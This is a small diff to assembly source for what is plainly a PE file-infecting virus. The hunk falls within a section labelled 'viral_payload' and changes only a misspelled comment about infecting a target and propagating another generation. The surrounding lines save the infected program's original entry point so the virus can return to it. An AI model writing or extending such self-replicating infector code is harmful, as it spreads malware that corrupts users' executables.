@@ -47,7 +47,7 @@ viral_payload:
 ; If this is not generation 0 then the originalEntryPoint variable will have
 ; been set when the currently executing PE was infected. We need to stash that
 ; somewhere we can JMP to later. We'll be writing over originalEntryPoint when
-; we find a target to infect and propogate another generation.
+; we find a target to infect and propagate another generation.
 @@saveoep:
     mov eax, [ebp + originalEntryPoint]
     mov [ebp + savedEntryPoint], eax
